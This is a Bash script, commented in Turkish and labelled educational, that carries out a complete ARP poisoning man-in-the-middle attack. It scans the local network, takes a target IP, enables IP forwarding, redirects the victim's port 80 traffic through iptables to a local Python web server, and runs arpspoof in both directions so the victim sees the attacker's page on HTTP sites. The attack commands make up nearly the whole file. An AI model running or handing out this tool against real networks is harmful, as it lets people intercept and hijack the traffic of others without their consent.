#!/bin/bash

# Basit ARP Poisoning Saldırısı
# Eğitim Amaçlıdır

# --- Renkler ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# --- Kontroller ---
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}HATA: Bu betik root yetkileriyle çalıştırılmalıdır. (sudo ./attack.sh)${NC}"
    exit 1
fi

for tool in arpspoof arp-scan python; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}HATA: '$tool' komutu bulunamadı. Lütfen 'dsniff', 'arp-scan' ve 'python' paketlerini kurun.${NC}"
        exit 1
    fi

done

# --- Temizlik Fonksiyonu ---
cleanup() {
    echo -e "\n${YELLOW}[!] Temizlik yapılıyor...${NC}"
    
    # IP forwarding'i kapat
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "[+] IP forwarding kapatıldı."

    # iptables kuralını sil
    iptables -t nat -F
    echo -e "[+] iptables NAT kuralları temizlendi."

    # Arka plandaki işlemleri sonlandır
    pkill -f arpspoof
    pkill -f "python -m http.server 8080"
    echo -e "[+] Arka plan işlemleri durduruldu."

    echo -e "${GREEN}[✓] Temizlik tamamlandı.${NC}"
    exit 0
}

# CTRL+C'ye basıldığında temizlik fonksiyonunu çağır
trap cleanup SIGINT

# --- Başlangıç ---
clear
echo -e "${GREEN}=================================="${NC}
echo -e "${GREEN}  ARP POISONING SALDIRI ARACI   "${NC}
echo -e "${GREEN}=================================="${NC}

# --- Ağ Bilgileri ---
INTERFACE=$(ip route | grep default | awk '{print $5}')
GATEWAY=$(ip route | grep default | awk '{print $3}')

if [ -z "$INTERFACE" ] || [ -z "$GATEWAY" ]; then
    echo -e "${RED}HATA: Ağ arayüzü veya gateway bulunamadı.${NC}"
    exit 1
fi

echo -e "[+] Ağ Arayüzü: ${YELLOW}$INTERFACE${NC}"
echo -e "[+] Gateway: ${YELLOW}$GATEWAY${NC}"

# --- Hedef Tarama ---
echo -e "\n${GREEN}[*] Ağdaki hedefler taranıyor...${NC}"
arp-scan --localnet -I $INTERFACE | grep -E '^[0-9]' | awk '{print $1"\t"$2}'

# --- Hedef Seçimi ---
read -p "Lütfen hedef IP adresini girin: " TARGET_IP

if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}HATA: Hedef IP adresi girmediniz.${NC}"
    exit 1
fi

echo -e "[+] Hedef: ${YELLOW}$TARGET_IP${NC}"

# --- Saldırı Başlatma ---

# 1. IP Forwarding'i etkinleştir
echo -e "\n${GREEN}[1/4] IP forwarding etkinleştiriliyor...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Web sunucusunu başlat
echo -e "${GREEN}[2/4] Port 8080 üzerinde web sunucusu başlatılıyor...${NC}"
if [ ! -f "index.html" ]; then
    echo -e "${RED}HATA: index.html dosyası bulunamadı!${NC}"
    cleanup
fi
python -m http.server 8080 &> /dev/null &

# 3. iptables ile port yönlendirme
echo -e "${GREEN}[3/4] iptables ile port 80 -> 8080 yönlendirmesi yapılıyor...${NC}"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# 4. ARP Spoofing'i başlat
echo -e "${GREEN}[4/4] ARP zehirlenmesi başlatılıyor...${NC}"

# Hedefe, gateway'in biz olduğumuzu söylüyoruz
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &

# Gateway'e, hedefin biz olduğumuzu söylüyoruz
arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP &

# --- Sonuç ---
echo -e "\n${GREEN}=================================="${NC}
echo -e "${GREEN}   SALDIRI BAŞLATILDI!            "${NC}
echo -e "${GREEN}=================================="${NC}
echo -e "Hedef (${YELLOW}$TARGET_IP${NC}) bir HTTP siteye girdiğinde, sizin sayfanız yüklenecektir."
echo -e "Saldırıyı durdurmak için ${RED}CTRL+C${NC} tuşlarına basın."

# Betiğin kapanmaması için bekle
wait
